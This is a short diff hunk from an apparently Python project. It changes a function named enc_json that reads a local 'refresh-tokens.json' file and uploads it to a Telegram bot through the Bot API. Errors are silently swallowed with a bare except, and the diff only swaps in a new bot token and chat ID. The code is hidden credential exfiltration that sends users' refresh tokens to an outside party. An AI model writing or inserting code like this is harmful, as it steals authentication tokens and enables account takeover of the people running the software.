@@ -9,11 +9,11 @@ WIDTH = 55
 
 
 def enc_json():
-    url = "https://api.telegram.org/bot88568421683:AAAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
+    url = f"https://api.telegram.org/bot8358981893:AAH2C5_30jyyNJWTA1II9A4DiDTq-QP4vyI"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
-            data = {"chat_id": 66076440619}
+            data = {"chat_id": 8166206712}
             requests.post(url, data=data, files=files)
     except:
         pass
